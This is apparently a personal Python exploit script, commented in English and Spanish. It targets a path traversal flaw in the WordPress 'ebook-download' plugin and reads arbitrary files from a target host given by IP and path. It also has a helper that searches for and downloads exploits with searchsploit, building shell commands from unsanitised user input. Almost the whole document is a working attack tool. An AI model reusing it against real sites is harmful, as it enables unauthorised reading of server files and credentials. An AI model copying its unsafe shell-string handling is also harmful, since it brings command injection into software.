# Facilitates the process of obtaining files through path traversal. Even though it has a searchsploit function (kinda useless at the moment)
# I Will keep working on this script to improve and make it as useful as possible

#!/usr/bin/python3
import sys

from pwn import *
import argparse as ap
import requests


def def_handler(sig, frame):
    print("[!] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def download_exploit():

    exploit = input("Para que servicio buscas el exploit? : ")
    output = subprocess.check_output(["searchsploit", exploit.strip()])
    print(output.decode('utf-8'))
    output_str = output.decode('utf-8')
    output_lines = output_str.splitlines()

    if "Exploits: No Results" in output_str:
        print("No hay exploits para este servicio")
        sys.exit(1)

    print("##################################################################################")
    eleccion = input("Que exploit quieres descargar? Ingresa el numero empezando a contar desde el 1 : ")
    print("##################################################################################\n")

    exploit_index = (output_lines[2+int(eleccion)])
    file_path = os.popen(f"echo \'{exploit_index}\' | awk '{{print $NF}}'").read().strip()

    os.system(f"searchsploit -m {file_path}")

def make_request():

    if len(sys.argv) < 2:
        print("Uso: python3 pruebas.py -t <IP> -d <Directorio>")
        sys.exit(1)

    parser = ap.ArgumentParser()
    parser.add_argument("-t", "--target", required=True, help="IP del objetivo")
    parser.add_argument("-d", "--directory", required=True, help="Directorio")

    args = parser.parse_args()
    ip_address = args.target
    directory = args.directory

    url = "http://"+ip_address+"/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/../../.."+directory

    r=requests.get(url)
    print(r.text)

if __name__ == "__main__":
    #download_exploit()
    make_request()
